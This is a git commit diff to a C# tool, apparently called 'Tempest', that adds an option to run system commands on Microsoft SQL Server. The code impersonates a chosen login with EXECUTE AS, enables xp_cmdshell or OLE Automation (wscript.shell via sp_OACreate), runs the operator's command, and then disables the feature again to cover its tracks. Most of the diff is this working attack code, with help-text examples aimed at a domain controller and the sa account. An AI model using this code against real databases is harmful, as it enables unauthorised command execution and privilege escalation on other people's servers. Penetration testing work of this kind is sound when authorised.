1161b41fc466145fb25fd7b7f90f08e2e684c5be
Ervin <ervinasmiltenis@gmail.com>
2023-11-07 18:23:21 +0000

    Added option for code execution via OLE or xp_cmdshell

--- Tempest/Program.cs
+++ Tempest/Program.cs
@@ -12,12 +12,92 @@ namespace Tempest {
                         "-u | Specify the user to authenticate as\n\t" +
                         "-p | Specify the password of the user authenticating as\n\t" +
                         "-q | Specify the query to execute against the server\n\t" +
-                        "-p | Check for privilege escalation vectors. Possible options: 'impersonation'\n\n" +
+                        "-p | Check for privilege escalation vectors. Possible options: 'impersonation'\n\t" +
+                        "-c | Execute a system command. Requires: '-i <USER TO EXEC AS>' and '-m <EXEC METHOD>' ('ole', 'xp_cmdshell') flags set\n\n" +
                         "Example Usage:\n\n" +
                         "\tUsing Standard Security (Username + Password)\n\t.\\Tempest -s 'dc01.corp1.com' -d 'master' -u 'sa' -p 'letmein123!' -q 'SELECT SYSTEM_USER;'\n\n" +
                         "\tUsing Trusted Connection (Kerberos Authentication)\n\t.\\Tempest -s 'dc01.corp1.com' -d 'master' -q 'SELECT SYSTEM_USER;'\n\n" +
-                        "\t.Check for Privilege Escalation\n\t.\\Tempest -s 'dc01.corp1.com' -d 'master' -p 'impersonation'\n");
+                        "\tExecuting a system command\n\t.\\Tempest -s 'dc01.corp1.com' -i 'sa' -m 'xp_cmdshell' -c 'whoami'\n\n" +
+                        "\tCheck for Privilege Escalation\n\t.\\Tempest -s 'dc01.corp1.com' -d 'master' -p 'impersonation'\n");
             Environment.Exit(0);
+        }
+
+        static void commandExec(SqlConnection con, string cmd, string execMethod, string executeAs)
+        {
+            try
+            {
+                if (execMethod == "xp_cmdshell")
+                {
+                    // Enable xp_cmdshell
+                    string enableXPCMD = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE";
+                    // Disable xp_cmdshell once command has executed
+                    string disableXPCMD = "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;";
+                    string escalatePrivs = ("EXECUTE AS LOGIN = '" + executeAs + "';");
+                    string executeCMD = ("EXEC xp_cmdshell '" + cmd + "';");
+
+                    // Execyte as specified user
+                    SqlCommand command = new SqlCommand(escalatePrivs, con);
+                    SqlDataReader exec = command.ExecuteReader();
+                    exec.Close();
+
+                    // Enable xp_cmdshell
+                    command = new SqlCommand(enableXPCMD, con);
+                    exec = command.ExecuteReader();
+                    exec.Close();
+
+                    // Execute system command
+                    Console.WriteLine("[+] Executing Command:");
+                    command = new SqlCommand(executeCMD, con);
+                    exec = command.ExecuteReader();
+
+                    while (exec.Read())
+                    {
+                        Console.WriteLine(exec[0]);
+                    }
+                    exec.Close();
+
+                    // Disable xp_cmdshell
+                    command = new SqlCommand(disableXPCMD, con);
+                    exec = command.ExecuteReader();
+                    exec.Close();
+
+                    con.Close();
+                } else if (execMethod == "ole")
+                {
+                    // Enable OLE and invoke sp_OACreate and sp_OAMethod
+                    string escalatePrivs = ("EXECUTE AS LOGIN = '" + executeAs + "';");
+                    string enableOLE = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
+                    string disableOLE = "EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;";
+                    string executeCMD = ("DECLARE @command INT; EXEC sp_oacreate 'wscript.shell', @command OUTPUT; EXEC sp_oamethod @command, 'run', null, 'cmd /c " + cmd + "';");
+
+                    // Impersonate specified user
+                    SqlCommand command = new SqlCommand(escalatePrivs, con);
+                    SqlDataReader exec = command.ExecuteReader();
+                    exec.Close();
+
+                    // Enable OLE
+                    command = new SqlCommand(enableOLE, con);
+                    exec = command.ExecuteReader();
+                    exec.Close();
+
+                    // Execute user specified command
+                    command = new SqlCommand(executeCMD, con);
+                    exec = command.ExecuteReader();
+                    Console.WriteLine("[*] Command Executed!");
+                    exec.Close();
+
+                    // Disable OLE
+                    command = new SqlCommand(disableOLE, con);
+                    exec = command.ExecuteReader();
+                    exec.Close();
+
+                    con.Close();
+                }
+            } catch
+            {
+                con.Close();
+                Environment.Exit(0);
+            }
         }
 
         static void privEscCheck(string typeOfPriv, SqlConnection con)
@@ -39,6 +119,7 @@ namespace Tempest {
                     } else
                     {
                         Console.WriteLine("[-] No Users Found to Impersonate. Exiting.");
+                        con.Close();
                         Environment.Exit(0);
                     }
                     exec.Close();
@@ -56,16 +137,19 @@ namespace Tempest {
                         }
                         execAsUser.Close();
                     }
+                    con.Close();
                     Environment.Exit(0);
                 } else
                 {
                     Console.WriteLine("[!] Error: '" + typeOfPriv + "' CHECK DOES NOT EXIST!");
+                    con.Close();
                     Environment.Exit(0);
                 }
             }
             catch (SqlException)
             {
                 Console.WriteLine("[-] Error. Check your syntax");
+                con.Close();
                 Environment.Exit(0);
             }
         }
@@ -82,8 +166,10 @@ namespace Tempest {
                     Console.WriteLine(exec[0]);
                 }
                 exec.Close();
+                con.Close();
             } catch
             {
+                con.Close();
                 Environment.Exit(0);
             }
         }
@@ -119,6 +205,7 @@ namespace Tempest {
             }
             catch {
                 Console.WriteLine("[!] Connection: FAILURE");
+                con.Close();
                 Environment.Exit(0);
             }
             return con;
@@ -131,33 +218,44 @@ namespace Tempest {
             string sqlPass = "";
             string sqlQuery = "";
             string typeOfPriv = "";
+            string command = "";
+            string executeCommandAs = "";
+            string execMethod = "";
 
             for (int i = 0; i < args.Length; i++) {
                 if (args[i] == "-h" || args.Length == 0) {
                     printHelp();
                 }
-                // Get the server
                 if (args[i] == "-s") {
                     sqlServer = args[i + 1];
                 }
-                // Get the database, otherwise use master
                 if (args[i] == "-d") {
                     database = args[i + 1];
                 }
-                // Get credentials for trusted connection
                 if (args[i] == "-u") {
                     sqlUser = args[i + 1];
                 }
                 if (args[i] == "-p") {
                     sqlPass = args[i + 1];
                 }
-                // Get the query to execute against the server
                 if (args[i] == "-q") {
                     sqlQuery = args[i + 1];
                 }
                 if (args[i] == "-p")
                 {
                     typeOfPriv = args[i + 1];
+                }
+                if (args[i] == "-c")
+                {
+                    command = args[i + 1];
+                }
+                if (args[i] == "-i")
+                {
+                    executeCommandAs = args[i + 1]; 
+                }
+                if (args[i] == "-m")
+                {
+                    execMethod = args[i + 1];
                 }
             }
 
@@ -173,6 +271,11 @@ namespace Tempest {
             {
                 privEscCheck(typeOfPriv, con);
             }
+
+            if (command != "")
+            {
+                commandExec(con, command, execMethod, executeCommandAs);
+            } 
 
             con.Close();
             Environment.Exit(0);
